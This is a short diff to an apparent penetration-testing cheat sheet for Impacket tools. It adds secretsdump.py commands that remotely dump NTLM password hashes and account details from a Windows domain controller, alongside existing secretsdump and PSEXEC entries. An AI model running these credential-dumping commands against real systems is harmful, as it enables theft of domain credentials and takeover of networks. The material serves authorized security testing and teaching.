@@ -67,6 +67,16 @@ secretsdump.py  -ntds <ntds_file.dit> -system <SYSTEM_FILE> -hashes <lmhash:ntha
 secretsdump.py <domain>/<dc_bios_name>\$/@<ip> -no-pass -just-dc-user "Administrator"
 ```
 
+## secretsdump - remote extract
+```
+secretsdump.py -just-dc-ntlm -outputfile <ntlm-extract-file> <domain>/<user>:<password>@<ip>
+```
+
+## secretsdump - remote extract + users infos
+```
+secretsdump.py -just-dc -pwd-last-set -user-status -outputfile <ntlm-extract-file> <domain>/<user>:<password>@<ip>
+```
+
 % impacket, windows, exec
 
 ## PSEXEC with username // create a new service (using \pipe\svcctl via SMB)
